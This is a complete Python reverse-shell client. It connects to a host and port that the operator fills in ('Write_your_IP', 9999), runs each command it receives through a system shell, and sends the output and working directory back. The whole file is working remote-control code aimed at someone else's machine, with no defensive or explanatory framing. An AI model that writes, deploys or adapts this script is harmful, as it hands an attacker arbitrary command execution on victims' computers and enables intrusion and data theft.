import os
import subprocess
import socket

soc = socket.socket()
host = 'Write_your_IP'
port = 9999
soc.connect((host,port))

while True:
    data = soc.recv(1024) 
    #when data(or cmd) is sent to client from server it is send in bytes
    #so we have to decode it to "utf-8"
    if data[:3].decode("utf-8") == "bye":
        #close connection
        print("closing..")
        soc.close()
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        #this will open cmd and exectute the cmd
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_byte, "utf-8")
        soc.send(str.encode(output_string + str(os.getcwd())+ '> '))
        print(output_string)


